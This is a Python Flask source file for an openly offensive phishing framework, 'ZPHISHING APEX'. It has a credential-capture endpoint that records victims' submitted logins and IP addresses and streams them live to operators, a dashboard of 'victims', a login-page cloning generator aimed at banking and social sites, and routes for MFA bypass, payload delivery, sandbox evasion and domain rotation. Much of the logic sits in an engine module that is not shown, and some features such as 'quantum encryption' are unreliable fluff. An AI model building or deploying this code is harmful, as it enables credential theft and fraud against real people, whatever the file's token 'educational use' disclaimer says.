#!/usr/bin/env python3
"""
ZPHISHING APEX v4.0 — "APEX"
The Most Advanced Phishing Framework Ever Created
Built by worm shadow for He
"""

import os
import sys
import json
import time
import hashlib
import sqlite3
import threading
import subprocess
import asyncio
import signal
import atexit
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from enum import Enum, auto
from functools import wraps

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from flask import Flask, request, render_template_string, redirect, session, jsonify, send_file, make_response, g
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, get_jwt_identity
from flask_mail import Mail, Message
from flask_wtf import CSRFProtect
from flask_login import LoginManager, UserMixin, login_user, login_required, current_user, logout_user
from flask_admin import Admin
from flask_restful import Api, Resource
import click
import rich
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.tree import Tree
from rich.syntax import Syntax
from rich.markdown import Markdown
from rich.prompt import Prompt, Confirm
from rich.status import Status

# Initialize colorama for Windows compatibility
from colorama import init, Fore, Style, Back
init(autoreset=True)

# Initialize Rich console
console = Console()

# Version
__version__ = "4.0.0"
__codename__ = "APEX"
__author__ = "worm shadow"
__created_for__ = "He"

class ZPhishingAPEX:
    def __init__(self):
        self.app = Flask(__name__)
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")
        self.setup_config()
        self.setup_extensions()
        self.setup_routes()
        self.setup_commands()
        self.engine = None
        self.running = False

    def setup_config(self):
        """Setup application configuration"""
        self.app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or os.urandom(32)
        self.app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL') or 'sqlite:///zphishing.db'
        self.app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
        self.app.config['JWT_SECRET_KEY'] = os.environ.get('JWT_SECRET_KEY') or os.urandom(32)
        self.app.config['JWT_ACCESS_TOKEN_EXPIRES'] = timedelta(hours=24)
        self.app.config['MAIL_SERVER'] = os.environ.get('MAIL_SERVER', 'smtp.gmail.com')
        self.app.config['MAIL_PORT'] = int(os.environ.get('MAIL_PORT', 587))
        self.app.config['MAIL_USE_TLS'] = True
        self.app.config['MAIL_USERNAME'] = os.environ.get('MAIL_USERNAME')
        self.app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD')
        self.app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER')

    def setup_extensions(self):
        """Setup Flask extensions"""
        self.db = SQLAlchemy(self.app)
        self.migrate = Migrate(self.app, self.db)
        self.jwt = JWTManager(self.app)
        self.mail = Mail(self.app)
        self.csrf = CSRFProtect(self.app)
        self.login_manager = LoginManager(self.app)
        self.admin = Admin(self.app, name='ZPHISHING APEX', template_mode='bootstrap4')
        self.api = Api(self.app)
        CORS(self.app)
        self.limiter = Limiter(
            app=self.app,
            key_func=get_remote_address,
            default_limits=["1000 per hour"]
        )

    def setup_routes(self):
        """Setup application routes"""

        @self.app.route('/')
        def index():
            return redirect('/dashboard')

        @self.app.route('/dashboard')
        def dashboard():
            return render_template_string(DASHBOARD_TEMPLATE)

        @self.app.route('/api/status')
        def api_status():
            return jsonify({
                'status': 'online',
                'version': __version__,
                'codename': __codename__,
                'timestamp': datetime.now().isoformat()
            })

        @self.app.route('/api/campaigns', methods=['GET', 'POST'])
        @jwt_required()
        def campaigns():
            if request.method == 'POST':
                data = request.get_json()
                campaign_id = self.engine.create_campaign(data)
                return jsonify({'id': campaign_id}), 201
            else:
                campaigns = self.engine.list_campaigns()
                return jsonify(campaigns)

        @self.app.route('/api/campaigns/<campaign_id>', methods=['GET', 'PUT', 'DELETE'])
        @jwt_required()
        def campaign_detail(campaign_id):
            if request.method == 'GET':
                campaign = self.engine.get_campaign(campaign_id)
                return jsonify(campaign)
            elif request.method == 'PUT':
                data = request.get_json()
                self.engine.update_campaign(campaign_id, data)
                return jsonify({'status': 'updated'})
            elif request.method == 'DELETE':
                self.engine.delete_campaign(campaign_id)
                return jsonify({'status': 'deleted'})

        @self.app.route('/api/victims', methods=['GET'])
        @jwt_required()
        def victims():
            campaign_id = request.args.get('campaign_id')
            victims = self.engine.get_victims(campaign_id)
            return jsonify(victims)

        @self.app.route('/api/analytics', methods=['GET'])
        @jwt_required()
        def analytics():
            stats = self.engine.get_analytics()
            return jsonify(stats)

        @self.app.route('/api/templates', methods=['GET', 'POST'])
        @jwt_required()
        def templates():
            if request.method == 'POST':
                data = request.get_json()
                template_id = self.engine.create_template(data)
                return jsonify({'id': template_id}), 201
            else:
                templates = self.engine.list_templates()
                return jsonify(templates)

        @self.app.route('/api/ai/generate', methods=['POST'])
        @jwt_required()
        def ai_generate():
            data = request.get_json()
            result = self.engine.ai_generate_template(data)
            return jsonify(result)

        @self.app.route('/api/evasion/check', methods=['POST'])
        def evasion_check():
            data = request.get_json()
            result = self.engine.check_evasion(data)
            return jsonify(result)

        @self.app.route('/api/blockchain/verify', methods=['POST'])
        @jwt_required()
        def blockchain_verify():
            data = request.get_json()
            result = self.engine.blockchain_verify(data)
            return jsonify(result)

        @self.app.route('/api/quantum/encrypt', methods=['POST'])
        @jwt_required()
        def quantum_encrypt():
            data = request.get_json()
            result = self.engine.quantum_encrypt(data)
            return jsonify(result)

        @self.app.route('/api/distributed/deploy', methods=['POST'])
        @jwt_required()
        def distributed_deploy():
            data = request.get_json()
            result = self.engine.distributed_deploy(data)
            return jsonify(result)

        @self.app.route('/api/mfa/bypass', methods=['POST'])
        @jwt_required()
        def mfa_bypass():
            data = request.get_json()
            result = self.engine.mfa_bypass(data)
            return jsonify(result)

        @self.app.route('/api/payload/deliver', methods=['POST'])
        @jwt_required()
        def payload_deliver():
            data = request.get_json()
            result = self.engine.deliver_payload(data)
            return jsonify(result)

        @self.app.route('/api/recon/target', methods=['POST'])
        @jwt_required()
        def recon_target():
            data = request.get_json()
            result = self.engine.recon_target(data)
            return jsonify(result)

        @self.app.route('/api/social/engage', methods=['POST'])
        @jwt_required()
        def social_engage():
            data = request.get_json()
            result = self.engine.social_engineer(data)
            return jsonify(result)

        @self.app.route('/api/infrastructure/spin', methods=['POST'])
        @jwt_required()
        def infrastructure_spin():
            data = request.get_json()
            result = self.engine.spin_infrastructure(data)
            return jsonify(result)

        @self.app.route('/api/infrastructure/destroy', methods=['POST'])
        @jwt_required()
        def infrastructure_destroy():
            data = request.get_json()
            result = self.engine.destroy_infrastructure(data)
            return jsonify(result)

        @self.app.route('/api/auth/login', methods=['POST'])
        def auth_login():
            data = request.get_json()
            result = self.engine.authenticate(data)
            if result['success']:
                access_token = create_access_token(identity=data['username'])
                return jsonify({'access_token': access_token})
            else:
                return jsonify({'error': 'Invalid credentials'}), 401

        @self.app.route('/api/auth/register', methods=['POST'])
        def auth_register():
            data = request.get_json()
            result = self.engine.register_user(data)
            return jsonify(result)

        @self.app.route('/capture', methods=['POST'])
        def capture():
            campaign_id = request.args.get('c', '')
            data = request.form.to_dict()

            # Get request info
            request_info = {
                'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
                'user_agent': request.headers.get('User-Agent', 'unknown'),
                'referer': request.headers.get('Referer', ''),
                'timestamp': datetime.now().isoformat()
            }

            # Check evasion
            if self.engine.check_evasion(request_info):
                return redirect(self.engine.get_redirect_url(campaign_id))

            # Capture credentials
            victim_id = self.engine.capture_credentials(campaign_id, data, request_info)

            # Blockchain verification
            verification = self.engine.blockchain_verify_credentials(data)

            # Notify via WebSocket
            self.socketio.emit('new_victim', {
                'campaign_id': campaign_id,
                'victim_id': victim_id,
                'data': data,
                'verification': verification
            }, room='operators')

            return redirect(self.engine.get_redirect_url(campaign_id))

        @self.socketio.on('connect')
        def handle_connect():
            join_room('operators')
            emit('status', {'msg': 'Connected to ZPHISHING APEX'})

        @self.socketio.on('disconnect')
        def handle_disconnect():
            leave_room('operators')

    def setup_commands(self):
        """Setup CLI commands"""

        @self.app.cli.command()
        def init_db():
            """Initialize the database"""
            self.db.create_all()
            console.print("[green]Database initialized[/green]")

        @self.app.cli.command()
        def create_admin():
            """Create admin user"""
            username = click.prompt('Username')
            password = click.prompt('Password', hide_input=True)
            email = click.prompt('Email')
            self.engine.create_user(username, password, email, role='admin')
            console.print(f"[green]Admin user '{username}' created[/green]")

        @self.app.cli.command()
        @click.argument('campaign_id')
        def start_campaign(campaign_id):
            """Start a campaign"""
            self.engine.start_campaign(campaign_id)
            console.print(f"[green]Campaign {campaign_id} started[/green]")

        @self.app.cli.command()
        def list_campaigns():
            """List all campaigns"""
            campaigns = self.engine.list_campaigns()
            table = Table(title="Campaigns")
            table.add_column("ID", style="cyan")
            table.add_column("Name", style="magenta")
            table.add_column("Template", style="green")
            table.add_column("Status", style="yellow")
            table.add_column("Victims", style="red")

            for c in campaigns:
                table.add_row(c['id'], c['name'], c['template'], c['status'], str(c['victims']))

            console.print(table)

    def run(self, host='0.0.0.0', port=8080, debug=False):
        """Run the application"""
        self.running = True

        # Initialize engine
        with Status("[bold green]Initializing ZPHISHING APEX..."):
            from core.engine import ZPhishingEngine
            self.engine = ZPhishingEngine(self.app, self.db, self.socketio)

        # Print banner
        self.print_banner()

        # Start server
        console.print(f"\n[bold cyan]Starting server on {host}:{port}[/bold cyan]")
        self.socketio.run(self.app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)

    def print_banner(self):
        """Print the banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗  ║
║   ╚══███╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝  ║
║     ███╔╝ ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║       ║
║    ███╔╝  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║       ║
║   ███████╗██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╗  ║
║   ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  ║
║                                                              ║
║              A P E X   P R O T O C O L   v 4 . 0              ║
║                                                              ║
║   The Most Advanced Phishing Framework Ever Created           ║
║   Built by worm shadow for He                                 ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        console.print(Panel(banner, style="bold red", expand=False))
        console.print(f"\n[bold yellow]Version:[/bold yellow] {__version__} ({__codename__})")
        console.print(f"[bold yellow]Author:[/bold yellow] {__author__}")
        console.print(f"[bold yellow]Created for:[/bold yellow] {__created_for__}")
        console.print("\n[bold red]For educational and authorized security testing only[/bold red]\n")

# Dashboard Template
DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZPHISHING APEX — Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
        body { font-family: 'JetBrains Mono', monospace; background: #0a0a0f; }
        .glass { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
        .glow { box-shadow: 0 0 20px rgba(255,0,64,0.3); }
        .neon-text { text-shadow: 0 0 10px rgba(255,0,64,0.8); }
    </style>
</head>
<body class="text-white">
    <div class="min-h-screen p-6">
        <!-- Header -->
        <div class="flex justify-between items-center mb-8">
            <div>
                <h1 class="text-4xl font-bold neon-text text-red-500">ZPHISHING APEX</h1>
                <p class="text-gray-400 mt-1">The Most Advanced Phishing Framework</p>
            </div>
            <div class="flex gap-4">
                <button onclick="showSection('campaigns')" class="px-4 py-2 glass rounded-lg hover:bg-red-500/20 transition">Campaigns</button>
                <button onclick="showSection('victims')" class="px-4 py-2 glass rounded-lg hover:bg-red-500/20 transition">Victims</button>
                <button onclick="showSection('analytics')" class="px-4 py-2 glass rounded-lg hover:bg-red-500/20 transition">Analytics</button>
                <button onclick="showSection('ai')" class="px-4 py-2 glass rounded-lg hover:bg-red-500/20 transition">AI Engine</button>
                <button onclick="showSection('evasion')" class="px-4 py-2 glass rounded-lg hover:bg-red-500/20 transition">Evasion</button>
                <button onclick="showSection('infrastructure')" class="px-4 py-2 glass rounded-lg hover:bg-red-500/20 transition">Infrastructure</button>
            </div>
        </div>

        <!-- Stats Overview -->
        <div class="grid grid-cols-4 gap-4 mb-8">
            <div class="glass p-6 rounded-xl glow">
                <h3 class="text-gray-400 text-sm">Total Campaigns</h3>
                <p class="text-3xl font-bold text-red-500" id="total-campaigns">0</p>
            </div>
            <div class="glass p-6 rounded-xl">
                <h3 class="text-gray-400 text-sm">Active Campaigns</h3>
                <p class="text-3xl font-bold text-yellow-500" id="active-campaigns">0</p>
            </div>
            <div class="glass p-6 rounded-xl">
                <h3 class="text-gray-400 text-sm">Total Victims</h3>
                <p class="text-3xl font-bold text-green-500" id="total-victims">0</p>
            </div>
            <div class="glass p-6 rounded-xl">
                <h3 class="text-gray-400 text-sm">Success Rate</h3>
                <p class="text-3xl font-bold text-blue-500" id="success-rate">0%</p>
            </div>
        </div>

        <!-- Campaigns Section -->
        <div id="campaigns" class="section">
            <div class="glass p-6 rounded-xl mb-6">
                <div class="flex justify-between items-center mb-4">
                    <h2 class="text-2xl font-bold">Campaigns</h2>
                    <button onclick="createCampaign()" class="px-4 py-2 bg-red-500 rounded-lg hover:bg-red-600 transition">+ New Campaign</button>
                </div>
                <table class="w-full">
                    <thead>
                        <tr class="text-left text-gray-400 border-b border-gray-700">
                            <th class="pb-3">ID</th>
                            <th class="pb-3">Name</th>
                            <th class="pb-3">Template</th>
                            <th class="pb-3">Status</th>
                            <th class="pb-3">Victims</th>
                            <th class="pb-3">Actions</th>
                        </tr>
                    </thead>
                    <tbody id="campaigns-table">
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Victims Section -->
        <div id="victims" class="section hidden">
            <div class="glass p-6 rounded-xl">
                <h2 class="text-2xl font-bold mb-4">Victims</h2>
                <div id="victims-list" class="space-y-4"></div>
            </div>
        </div>

        <!-- Analytics Section -->
        <div id="analytics" class="section hidden">
            <div class="grid grid-cols-2 gap-6">
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-2xl font-bold mb-4">Campaign Performance</h2>
                    <canvas id="campaign-chart"></canvas>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-2xl font-bold mb-4">Geographic Distribution</h2>
                    <canvas id="geo-chart"></canvas>
                </div>
            </div>
        </div>

        <!-- AI Engine Section -->
        <div id="ai" class="section hidden">
            <div class="glass p-6 rounded-xl">
                <h2 class="text-2xl font-bold mb-4">AI Template Generator</h2>
                <div class="space-y-4">
                    <input type="text" id="ai-url" placeholder="Enter URL to clone..." class="w-full p-3 bg-gray-800 rounded-lg border border-gray-700 focus:border-red-500 outline-none">
                    <select id="ai-platform" class="w-full p-3 bg-gray-800 rounded-lg border border-gray-700 focus:border-red-500 outline-none">
                        <option value="auto">Auto-detect</option>
                        <option value="social">Social Media</option>
                        <option value="corporate">Corporate</option>
                        <option value="banking">Banking</option>
                        <option value="custom">Custom</option>
                    </select>
                    <button onclick="generateAI()" class="px-6 py-3 bg-red-500 rounded-lg hover:bg-red-600 transition">Generate Template</button>
                    <div id="ai-result" class="mt-4 p-4 bg-gray-800 rounded-lg hidden"></div>
                </div>
            </div>
        </div>

        <!-- Evasion Section -->
        <div id="evasion" class="section hidden">
            <div class="grid grid-cols-2 gap-6">
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-2xl font-bold mb-4">Domain Rotation</h2>
                    <div class="space-y-3">
                        <input type="text" id="domain-input" placeholder="Enter domain..." class="w-full p-3 bg-gray-800 rounded-lg border border-gray-700">
                        <button onclick="addDomain()" class="px-4 py-2 bg-red-500 rounded-lg hover:bg-red-600 transition">Add Domain</button>
                        <div id="domain-list" class="mt-4 space-y-2"></div>
                    </div>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-2xl font-bold mb-4">Sandbox Detection</h2>
                    <div class="space-y-3">
                        <label class="flex items-center gap-3">
                            <input type="checkbox" checked class="w-5 h-5">
                            <span>Enable sandbox detection</span>
                        </label>
                        <label class="flex items-center gap-3">
                            <input type="checkbox" checked class="w-5 h-5">
                            <span>Browser fingerprint spoofing</span>
                        </label>
                        <label class="flex items-center gap-3">
                            <input type="checkbox" checked class="w-5 h-5">
                            <span>Traffic obfuscation</span>
                        </label>
                        <label class="flex items-center gap-3">
                            <input type="checkbox" class="w-5 h-5">
                            <span>WAF bypass</span>
                        </label>
                    </div>
                </div>
            </div>
        </div>

        <!-- Infrastructure Section -->
        <div id="infrastructure" class="section hidden">
            <div class="grid grid-cols-3 gap-6">
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-2xl font-bold mb-4">Cloud Deployer</h2>
                    <div class="space-y-3">
                        <select class="w-full p-3 bg-gray-800 rounded-lg border border-gray-700">
                            <option>AWS</option>
                            <option>DigitalOcean</option>
                            <option>Google Cloud</option>
                            <option>Azure</option>
                        </select>
                        <button onclick="deployCloud()" class="w-full px-4 py-2 bg-red-500 rounded-lg hover:bg-red-600 transition">Deploy Instance</button>
                    </div>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-2xl font-bold mb-4">Docker</h2>
                    <div class="space-y-3">
                        <button onclick="buildDocker()" class="w-full px-4 py-2 bg-red-500 rounded-lg hover:bg-red-600 transition">Build Container</button>
                        <button onclick="startDocker()" class="w-full px-4 py-2 bg-yellow-500 rounded-lg hover:bg-yellow-600 transition">Start Container</button>
                    </div>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-2xl font-bold mb-4">Kubernetes</h2>
                    <div class="space-y-3">
                        <button onclick="deployK8s()" class="w-full px-4 py-2 bg-red-500 rounded-lg hover:bg-red-600 transition">Deploy to K8s</button>
                        <button onclick="scaleK8s()" class="w-full px-4 py-2 bg-blue-500 rounded-lg hover:bg-blue-600 transition">Scale</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Initialize Socket.IO
        const socket = io();

        socket.on('new_victim', (data) => {
            showNotification('New victim captured!', 'success');
            loadStats();
            loadVictims();
        });

        // Load initial data
        loadStats();
        loadCampaigns();

        function showSection(section) {
            document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
            document.getElementById(section).classList.remove('hidden');
        }

        async function loadStats() {
            const res = await fetch('/api/analytics');
            const data = await res.json();
            document.getElementById('total-campaigns').textContent = data.total_campaigns;
            document.getElementById('active-campaigns').textContent = data.active_campaigns;
            document.getElementById('total-victims').textContent = data.total_victims;
            document.getElementById('success-rate').textContent = data.success_rate + '%';
        }

        async function loadCampaigns() {
            const res = await fetch('/api/campaigns');
            const campaigns = await res.json();
            const tbody = document.getElementById('campaigns-table');
            tbody.innerHTML = campaigns.map(c => `
                <tr class="border-b border-gray-800">
                    <td class="py-3 text-red-500">${c.id}</td>
                    <td class="py-3">${c.name}</td>
                    <td class="py-3">${c.template}</td>
                    <td class="py-3"><span class="px-2 py-1 rounded text-xs ${c.status === 'active' ? 'bg-green-500/20 text-green-500' : 'bg-gray-500/20 text-gray-500'}">${c.status}</span></td>
                    <td class="py-3">${c.victims}</td>
                    <td class="py-3">
                        <button onclick="startCampaign('${c.id}')" class="px-3 py-1 bg-green-500 rounded text-sm hover:bg-green-600">Start</button>
                        <button onclick="deleteCampaign('${c.id}')" class="px-3 py-1 bg-red-500 rounded text-sm hover:bg-red-600 ml-2">Delete</button>
                    </td>
                </tr>
            `).join('');
        }

        async function loadVictims() {
            const res = await fetch('/api/victims');
            const victims = await res.json();
            const container = document.getElementById('victims-list');
            container.innerHTML = victims.map(v => `
                <div class="p-4 bg-gray-800 rounded-lg">
                    <div class="flex justify-between items-start">
                        <div>
                            <p class="text-red-500 font-bold">${v.email || v.username}</p>
                            <p class="text-gray-400 text-sm">IP: ${v.ip} | ${v.timestamp}</p>
                        </div>
                        <span class="px-2 py-1 rounded text-xs ${v.verified ? 'bg-green-500/20 text-green-500' : 'bg-yellow-500/20 text-yellow-500'}">
                            ${v.verified ? 'Verified' : 'Unverified'}
                        </span>
                    </div>
                </div>
            `).join('');
        }

        function createCampaign() {
            const name = prompt('Campaign name:');
            const template = prompt('Template:');
            if (name && template) {
                fetch('/api/campaigns', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({name, template})
                }).then(() => {
                    showNotification('Campaign created!', 'success');
                    loadCampaigns();
                });
            }
        }

        function startCampaign(id) {
            fetch(`/api/campaigns/${id}/start`, {method: 'POST'})
                .then(() => {
                    showNotification('Campaign started!', 'success');
                    loadCampaigns();
                });
        }

        function deleteCampaign(id) {
            if (confirm('Delete this campaign?')) {
                fetch(`/api/campaigns/${id}`, {method: 'DELETE'})
                    .then(() => {
                        showNotification('Campaign deleted!', 'success');
                        loadCampaigns();
                    });
            }
        }

        async function generateAI() {
            const url = document.getElementById('ai-url').value;
            const platform = document.getElementById('ai-platform').value;
            const resultDiv = document.getElementById('ai-result');
            resultDiv.classList.remove('hidden');
            resultDiv.innerHTML = '<p class="text-yellow-500">Generating...</p>';

            const res = await fetch('/api/ai/generate', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({url, platform})
            });
            const data = await res.json();
            resultDiv.innerHTML = `<pre class="text-green-500 text-sm overflow-x-auto">${JSON.stringify(data, null, 2)}</pre>`;
        }

        function showNotification(msg, type) {
            const div = document.createElement('div');
            div.className = `fixed top-4 right-4 px-6 py-3 rounded-lg ${type === 'success' ? 'bg-green-500' : 'bg-red-500'} text-white`;
            div.textContent = msg;
            document.body.appendChild(div);
            setTimeout(() => div.remove(), 3000);
        }

        // Charts
        const ctx1 = document.getElementById('campaign-chart').getContext('2d');
        new Chart(ctx1, {
            type: 'line',
            data: {
                labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun'],
                datasets: [{
                    label: 'Victims',
                    data: [12, 19, 3, 5, 2, 3],
                    borderColor: '#ff0040',
                    backgroundColor: 'rgba(255,0,64,0.1)',
                    fill: true
                }]
            },
            options: {responsive: true, plugins: {legend: {labels: {color: '#fff'}}}}
        });

        const ctx2 = document.getElementById('geo-chart').getContext('2d');
        new Chart(ctx2, {
            type: 'doughnut',
            data: {
                labels: ['US', 'UK', 'DE', 'FR', 'Other'],
                datasets: [{
                    data: [30, 25, 20, 15, 10],
                    backgroundColor: ['#ff0040', '#ff8000', '#ffff00', '#00ff80', '#0080ff']
                }]
            },
            options: {responsive: true, plugins: {legend: {labels: {color: '#fff'}}}}
        });
    </script>
</body>
</html>
"""

# Create CLI
@click.group()
@click.version_option(version=__version__, prog_name="zphishing")
def cli():
    """ZPHISHING APEX — The Most Advanced Phishing Framework"""
    pass

@cli.command()
@click.option('--host', default='0.0.0.0', help='Host to bind to')
@click.option('--port', default=8080, help='Port to bind to')
@click.option('--debug', is_flag=True, help='Enable debug mode')
def serve(host, port, debug):
    """Start the web server"""
    app = ZPhishingAPEX()
    app.run(host=host, port=port, debug=debug)

@cli.command()
def shell():
    """Start interactive shell"""
    console.print(Panel.fit("[bold red]ZPHISHING APEX Interactive Shell[/bold red]"))

    apex = ZPhishingAPEX()
    from core.engine import ZPhishingEngine
    apex.engine = ZPhishingEngine(apex.app, apex.db, apex.socketio)

    while True:
        try:
            cmd = Prompt.ask("\n[bold red]apex[/bold red]")

            if cmd == 'exit' or cmd == 'quit':
                break
            elif cmd == 'help':
                console.print(Panel("""
Commands:
  campaigns     - List all campaigns
  create        - Create new campaign
  start <id>    - Start campaign
  victims       - List victims
  templates     - List templates
  ai            - AI template generator
  evasion       - Evasion settings
  deploy        - Deploy infrastructure
  stats         - Show statistics
  exit          - Exit shell
                """, title="Help"))
            elif cmd == 'campaigns':
                apex.engine.list_campaigns()
            elif cmd == 'create':
                name = Prompt.ask("Campaign name")
                template = Prompt.ask("Template")
                redirect = Prompt.ask("Redirect URL")
                campaign_id = apex.engine.create_campaign({
                    'name': name, 'template': template, 'redirect_url': redirect
                })
                console.print(f"[green]Campaign created: {campaign_id}[/green]")
            elif cmd.startswith('start '):
                campaign_id = cmd.split()[1]
                apex.engine.start_campaign(campaign_id)
                console.print(f"[green]Campaign {campaign_id} started[/green]")
            elif cmd == 'victims':
                victims = apex.engine.get_victims()
                table = Table(title="Victims")
                table.add_column("ID", style="cyan")
                table.add_column("Email", style="magenta")
                table.add_column("IP", style="green")
                table.add_column("Timestamp", style="yellow")
                for v in victims:
                    table.add_row(v['id'], v.get('email', 'N/A'), v['ip'], v['timestamp'])
                console.print(table)
            elif cmd == 'templates':
                templates = apex.engine.list_templates()
                for t in templates:
                    console.print(f"  [cyan]{t['name']}[/cyan] - {t['platform']}")
            elif cmd == 'ai':
                url = Prompt.ask("URL to clone")
                result = apex.engine.ai_generate_template({'url': url})
                console.print(f"[green]Template generated: {result['id']}[/green]")
            elif cmd == 'evasion':
                console.print(Panel("""
Evasion Settings:
  ✓ Sandbox detection
  ✓ Browser fingerprint spoofing
  ✓ Traffic obfuscation
  ✓ Domain rotation
  ✓ WAF bypass
                """, title="Evasion"))
            elif cmd == 'deploy':
                provider = Prompt.ask("Cloud provider", choices=['aws', 'do', 'gcp', 'azure'])
                result = apex.engine.spin_infrastructure({'provider': provider})
                console.print(f"[green]Deployed: {result['id']}[/green]")
            elif cmd == 'stats':
                stats = apex.engine.get_analytics()
                console.print(Panel(f"""
Total Campaigns: {stats['total_campaigns']}
Active Campaigns: {stats['active_campaigns']}
Total Victims: {stats['total_victims']}
Success Rate: {stats['success_rate']}%
                """, title="Statistics"))

        except KeyboardInterrupt:
            break
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

if __name__ == '__main__':
    cli()
